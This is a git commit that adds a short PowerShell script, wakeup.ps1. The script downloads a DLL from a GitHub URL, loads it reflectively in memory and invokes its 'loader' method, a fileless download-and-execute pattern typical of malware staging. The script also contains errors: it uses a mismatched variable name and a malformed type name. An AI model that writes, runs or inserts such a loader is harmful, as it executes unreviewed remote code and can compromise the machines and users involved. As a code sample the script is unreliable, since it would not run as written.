0b15ab54aed882816a939d544ac4b91876ddee6e
mikewebcti <110481674+mikewebcti@users.noreply.github.com>
2022-11-23 11:29:27 -0500

    Add files via upload

---
+++ wakeup.ps1
@@ -0,0 +1,5 @@
+﻿$data = (New-Object System.Net.WebClient).DownloadData('https://github.com/mikewebcti/Nov22/raw/main/CTI.dll')
+$assem = [System.Reflection.Assembly]::LOad($data)
+$class = $assm.GetType("ClassLibrary1:Class1")
+$method = $class.GetMethod("loader")
+$method.Invoke(0, $null)
